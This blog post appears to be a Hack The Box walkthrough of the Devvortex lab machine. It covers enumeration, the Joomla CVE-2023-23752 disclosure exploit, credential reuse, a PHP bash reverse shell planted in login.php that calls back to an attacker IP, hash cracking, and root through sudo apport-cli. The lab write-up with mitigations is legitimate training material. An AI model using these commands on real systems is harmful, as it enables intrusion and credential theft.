---
layout: post
title: Devvortex
date: 2024-01-15 10:14:00-0400
description: Devvortex - Hack The Box walkthrough.
tags: easy-box HTB CTF credential-stuffing information-disclosure password-cracking
categories: HTB-Machines
thumbnail: /assets/img/20240115-devvortext-cover.png
giscus_comments: false
related_posts: true
toc:
  sidebar: left
featured: false
---

# Introduction
Devvortex is an easy Linux box. It involves enumerating a domain to reveal a Content Management System called *Joomla*.

An exploit is then used to perform an **Unauthenticated Information Disclosure.**

This results in stealing MySQL credentials which are **re-used** to authenticate to the Joomla admin panel.

From there a reverse shell is obtained by modifying the `login.php`. Once the reverse shell is established the MySQL database is enumerated  to obtain two hashes. Once a hash is cracked, SSH is used to log on.

**Privilege escalation** is achieved by exploiting a vulnerability in the `apport-cli` utility, which the user has `sudo` rights over. This ultimately spawns a privileged shell.

## Methods

### Unauthenticated information disclosure
Unauthenticated Information Disclosure refers to a security vulnerability where sensitive information is exposed without requiring authentication. It means that confidential data, such as personal details, configuration files, or database records, can be accessed by anyone without needing to log in or bypass security controls. 

This type of vulnerability often arises due to misconfigurations or flawed programming in web applications or services. It poses a significant risk because it can lead to data breaches and further exploitation.

In this case, an outdated Joomla version was exploited to obtain clear-text credentials.

>**Mitigation:** Ensure sensitive information is not vulnerable to unauthenticated disclosure,  keep systems patched, and encrypt sensitive data.

### Credential stuffing
Credential stuffing is a type of attack where stolen account credentials (usernames or email addresses and passwords) from one breach are used to attempt access to accounts on other websites. This attack relies on the fact that many people reuse the same login credentials across multiple sites.  It's a widespread method for gaining unauthorised access due to the commonality of password reuse.

In this case, the credentials from the information disclosure were re-used to obtain access to the Joomla administrator panel.

> **Mitigation:** Ensure passwords are not re-used across different services.

### Password cracking
Password cracking is the process of attempting to gain unauthorised access to restricted systems by figuring out the password. It often involves the use of software that employs various methods (like brute-force attacks, dictionary attacks, or rainbow table attacks) to guess passwords. This technique can be used against individual accounts or to decrypt encrypted data. The complexity and time it takes to crack a password can vary significantly based on the password's strength and the method used.

In this case, the hashes stolen from the MySQL database were cracked with `hashcat`.

**Mitigation:** Ensure complex passwords are used.

# Enumeration
Enumeration, as always starts with Nmap.
## Nmap scanning

```bash
nmap -sC -sV 10.129.15.24 -oN - | tee devvortex-initial-scan.txt
```

> *To output Nmap scan results to a file while also displaying them in the terminal, you can use the `-oN` option along with the `tee` command in Linux. The `-oN` option in Nmap is used to output the scan results to a file in a normal, human-readable format. The `tee` command in Unix-like operating systems reads from standard input and writes to both standard output and one or more files simultaneously.*

```
# Nmap 7.94SVN scan initiated Sun Jan 14 23:30:42 2024 as: nmap -sC -sV -oN - 10.129.15.24
Nmap scan report for 10.129.15.24
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 14 23:31:37 2024 -- 1 IP address (1 host up) scanned in 54.86 seconds
```


### Findings

1. Two ports open, 22 and 80.
2. Domain name http://devvortex.htb/ found.

## Subdomain scanning
Adding the domain to `/etc/hosts` file allows for the site to be browsed and reveals a landing page.

<img src="/assets/img/20240115-devvortext-landingpage1.png" alt="20240115-devvortext-landingpage1.png" class="auto-resize">

The site was then scanned for subdomains.

```bash
wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb/ -H 'Host:FUZZ.devvortex.htb' -t 50 --hc 302 > subdomain-scan.txt | tee
```

- The `-t 50` instructs wfuzz to have up to 50 concurrent connections which will speed up the scan.
- The `--hc 302` flag stands for "Hide Code". This option instructs wfuzz not to display results with the 302 status code. This can be helpful to filter out some of the redirection noise.


### Findings

The subdomain `dev` was identified.

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devvortex.htb/
Total requests: 19966
=====================================================================
ID           Response   Lines    Word       Chars       Payload                         
=====================================================================

000000019:   200        501 L    1581 W     23221 Ch    "dev"                           

Total time: 0
Processed Requests: 19966
Filtered Requests: 19965
Requests/sec.: 0
```

This is added  to `/etc/hosts` to allow the site to be browsed.

```bash
┌──(kali㉿kali)-[~/Documents/HTB-Machines/devvortex/scans]
└─$ cat /etc/hosts
<SNIP>
10.129.15.24    devvortex.htb dev.devvortex.htb
```

Navigating to the subdomain reveals another landing page.

<img src="/assets/img/20240115-devvortext-cover-landingpage2.png" alt="20240115-devvortext-cover-landingpage2.png" class="auto-resize">


## Subdomain directory scanning

The newly identified subdomain  `dev.devvortex.htb` can be fuzzed again for pages. 

```bash
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://dev.devvortex.htb/FUZZ -t 200 --hc 404,403 > subdomain-directory-scan.txt | tee
```

### Findings

The fuzzing revealed a number of directories on the subdomain. Lets start with the `administrator` directory.

<img src="/assets/img/20240115-devvortext-domainfuzzing.png" alt="20240115-devvortext-domainfuzzing.png" class="auto-resize">

Navigating to the `/administrator` page reveals a **Joomla** landing page.

<img src="/assets/img/20240115-devvortext-joomlapage.png" alt="20240115-devvortext-joomlapage.png" class="auto-resize">

### What is Joomla

Joomla is a popular, open-source Content Management System (CMS) used to build, manage, and publish content for websites, blogs, and online applications. It is written in PHP and uses a **MySQL** database to store content and settings.


# Exploitation

## Joomla compromise

Checking the subdomain's README.txt file reveals the Joomla version as 4.2.

A quick search of `searchsploit` and we find a promising exploit.

<img src="/assets/img/20240115-devvortext-joomlaexploit.png" alt="20240115-devvortext-joomlaexploit.png" class="auto-resize">

Using the `mirror` command the exploit can be copied to a working directory.

```bash
┌──(kali㉿kali)-[~/Documents/HTB-Machines/devvortex/exploits]
└─$ searchsploit -m exploits/php/webapps/51334.py
```

This exploit ran into some library issues so  another version on GitHub was used: https://github.com/svaltheim/CVE-2023-23752/blob/main/CVE-2023-23752

The exploit executed successfully and identified two users, site details and database information including credentials.

```
┌──(kali㉿kali)-[~/Documents/HTB-Machines/devvortex/exploits]
└─$ ./CVE-2023-23752 http://dev.devvortex.htb
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: False

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: <REDACTED>
DB name: joomla
DB prefix: sd4fg_
DB encryption 0

```

Password stuffing Lewis' credentials on the `/administrator` page resulted in a successful authentication.

Checking SSH with Lewis' credentials revealed no further credential re-use.

```bash
┌──(kali㉿kali)-[~/Documents/HTB-Machines/devvortex/exploits]
└─$ ssh lewis@10.129.15.24        
lewis@10.129.15.24's password: 
Permission denied, please try again.
lewis@10.129.15.24's password: 
```

## Foothold - PHP reverse shell

On the admin panel is a warning about the server using an outdated version of PHP.

<img src="/assets/img/20240115-devvortext-phpwarning.png" alt="20240115-devvortext-phpwarning.png" class="auto-resize">

Moving to `/System/Templates/Administrator Templates`, it was identified that the user has access to the PHP templates. The `login.php` was edited to send a reverse shell when the page is served.

The modification made was:

```php
<?php
system('bash -c "bash -i >& /dev/tcp/10.10.14.16/4321 00>&1"');
<SNIP>
```

- `system()` *Function in PHP*: This is a PHP function that is used to execute an external program. The `system` function will execute the given command and output the result. In this context, it is being used to execute a bash command.
- `bash -c`: This tells the system to execute the following string with Bash.
- `"bash -i >& /dev/tcp/10.10.14.16/4321 0<&1"`: This is the string command that Bash executes.
- `bash -i`: This starts an interactive Bash shell (`-i` flag for interactive).
- `>& /dev/tcp/10.10.14.16/4321`: This redirects the standard output (stdout) of the shell to a TCP connection to the specified IP address and port. 
- `0<&1`: This part redirects the standard input (stdin) to the shell from the same TCP connection. The `0<&1` means to take input (file descriptor 0) from the same place as the standard output (file descriptor 1).

> *The `>&` operator is shorthand for redirecting both stdout (1) and stderr (2).*

<img src="/assets/img/20240115-devvortext-revshell.png" alt="20240115-devvortext-revshell.png" class="auto-resize">

Starting a netcat listener and then navigating back to http://dev.devortex.htb/administrator in a private window returns as a reverse shell.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4321
listening on [any] 4321 ...
connect to [10.10.14.16] from (UNKNOWN) [10.129.15.24] 45554
bash: cannot set terminal process group (856): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb/administrator$ 

```

### Shell stabilisation

Now the shell can be stabilised before proceeding.

<img src="/assets/img/20240115-devvortext-shellupgrade.png" alt="20240115-devvortext-shellupgrade.png" class="auto-resize">

As shown above, running these commands sequentially, and then hitting enter a few times, will return a more interactive and stable shell.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
```

The sequence of commands will upgrade a basic shell into a fully interactive shell. This is often necessary because simple reverse shells can be quite limited (e.g., no tab completion, no interactive commands). Here's a brief explanation of each step:

1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`:
    - This command uses Python to spawn a new bash shell with pseudo-terminal (pty) support. This improves the shell's interactivity and handling of certain commands.

    
2.  `export TERM=xterm`:
    - After the Python command gives you a more functional shell,  set the `TERM` environment variable to `xterm`. This tells the shell what kind of terminal it's running in, allowing for better formatting and functionality (like clear screen, command history).

    
3. `Ctrl + Z`:
    - This key combination suspends the current foreground process (the shell), returning control to your local terminal without closing the shell.


4. `stty raw -echo; fg`:
    - `stty raw -echo`: This configures the terminal. `raw` mode means input characters are passed to the foreground process immediately, and `-echo` turns off input echoing, preventing characters from being displayed twice.
    - `fg`: This command brings the suspended process (your bash shell) back to the foreground.

    
5. **Hit Enter a Few Times**:
    - Sometimes, after running these commands, you might need to hit enter a few times to get the prompt of the interactive shell.

## Lateral movement - MySQL

Recall the credentials found with the Joomla exploit earlier:

```
Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: <REDACTED>
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

Trying them on the reverse shell is successful.

```mysql
mysql -h localhost -u lewis -p '<REDACTED>'
```

```mysql
www-data@devvortex:~/dev.devvortex.htb/administrator$ mysql -u lewis -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8889
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;  
+-------------------------------+  
| Tables_in_joomla |  
+-------------------------------+  
| sd4fg_action_log_config |  
| sd4fg_action_logs |  
| sd4fg_action_logs_extensions |  
| sd4fg_action_logs_users |  
| sd4fg_assets |  
| sd4fg_associations |  
| sd4fg_banner_clients |  
| sd4fg_banner_tracks |
<SNIP>
| sd4fg_users |

mysql> select * from sd4fg_users;  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+  
| id | name | username | email | password | block | sendEmail | registerDate | lastvisitDate | activation | params | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+  
| 649 | lewis | lewis | lewis@devvortex.htb | <REDACTED> | 0 | 1 | 2023-09-25 16:44:24 | 2023-11-26 13:51:53 | 0 | | NULL | 0 | | | 0 | |  
| 650 | logan paul | logan | logan@devvortex.htb | <REDACTED> | 0 | 0 | 2023-09-26 19:15:42 | NULL | | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL | 0 | | | 0 | |  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+

```

As shown above, two hashes were stolen from the database.

<img src="/assets/img/20240115-devvortext-sqlhashes.png" alt="20240115-devvortext-sqlhashes.png" class="auto-resize">

## Cracking the passwords

Using Hashcat, one of the hashes is quickly cracked.

```bash
──(kali㉿kali)-[~/Documents/HTB-Machines/devvortex/credentials]
└─$ hashcat -a 0 -m 3200 hashes /usr/share/wordlists/rockyou.txt       
hashcat (v6.2.6) starting
<SNIP>
<REDACTED>

```

This hash corresponds to the user `logan`.

## SSH 

Trying the password on SSH is successful.

```
┌──(kali㉿kali)-[~/Documents/HTB-Machines/devvortex/credentials]
└─$ ssh logan@10.129.15.24
logan@10.129.15.24's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 15 Jan 2024 06:46:03 AM UTC

  System load:           0.0
  Usage of /:            64.2% of 4.76GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             177
  Users logged in:       0
  IPv4 address for eth0: 10.129.15.24
  IPv6 address for eth0: dead:beef::250:56ff:fe96:b12d

  => There are 8 zombie processes.

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Nov 21 10:53:48 2023 from 10.10.14.23
logan@devvortex:~$ 

```

Grab the first flag!

<img src="/assets/img/20240115-devvortext-userflag.png" alt="20240115-devvortext-userflag.png" class="auto-resize">

# Privilege escalation

Using `sudo -l` lists the binaries `logan` can run with root privileges.

```bash
logan@devvortex:~$ sudo -l
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli

```

We can see here that `logan` can run `/usr/bin/apport-cli`.

## What is apport-cli

`apport-cli` is a command-line interface tool for Apport, which is a system in Ubuntu and other Debian-based Linux distributions used for reporting bugs and crashes. Apport automatically generates crash reports when a program fails and helps in debugging the causes of those failures. These reports can include details like the state of the program at the time of the crash, which can be invaluable for developers to diagnose and fix issues.

A key feature of the utility is a **Command-Line Interface**. As a CLI tool, `apport-cli` allows users to interact with the Apport crash reporting system directly from the terminal. This is particularly useful for servers or other systems where a graphical user interface (GUI) is not available.

## Exploiting apport-cli

The help menu reveals a number of options.

```bash
Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]

Options:
  -h, --help            show this help message and exit
  -f, --file-bug        Start in bug filing mode. Requires --package and an
                        optional --pid, or just a --pid. If neither is given,
                        display a list of known symptoms. (Implied if a single
                        argument is given.)
  -w, --window          Click a window as a target for filing a problem
                        report.
  -u UPDATE_REPORT, --update-bug=UPDATE_REPORT
                        Start in bug updating mode. Can take an optional
                        --package.
  -s SYMPTOM, --symptom=SYMPTOM
                        File a bug report about a symptom. (Implied if symptom
                        name is given as only argument.)
  -p PACKAGE, --package=PACKAGE
                        Specify package name in --file-bug mode. This is
                        optional if a --pid is specified. (Implied if package
                        name is given as only argument.)
  -P PID, --pid=PID     Specify a running program in --file-bug mode. If this
                        is specified, the bug report will contain more
                        information.  (Implied if pid is given as only
                        argument.)
  --hanging             The provided pid is a hanging application.
  -c PATH, --crash-file=PATH
                        Report the crash from given .apport or .crash file
                        instead of the pending ones in /var/crash. (Implied if
                        file is given as only argument.)
  --save=PATH           In bug filing mode, save the collected information
                        into a file instead of reporting it. This file can
                        then be reported later on from a different machine.
  --tag=TAG             Add an extra tag to the report. Can be specified
                        multiple times.
  -v, --version         Print the Apport version number.

```

With `sudo /usr/bin/apport-cli -f` the utility enters the **File a bug** mode to first attempt submitting a bug to understand how the utility works.

At the end, of the submission is an option to view the report.

<img src="/assets/img/20240115-devvortext-apportuse.png" alt="20240115-devvortext-apportuse.png" class="auto-resize">

The screen that follows opens in a `vim` style editor.

<img src="/assets/img/20240115-devvortext-apportshell.png" alt="20240115-devvortext-apportshell.png" class="auto-resize">

Passing a shell to it by typing `!/bin/bash` may, theoretically, launch a new shell under the sudo privileges from which the utility is being ran.

and it does!

<img src="/assets/img/20240115-devvortext-rootflag.png" alt="20240115-devvortext-rootflag.png" class="auto-resize">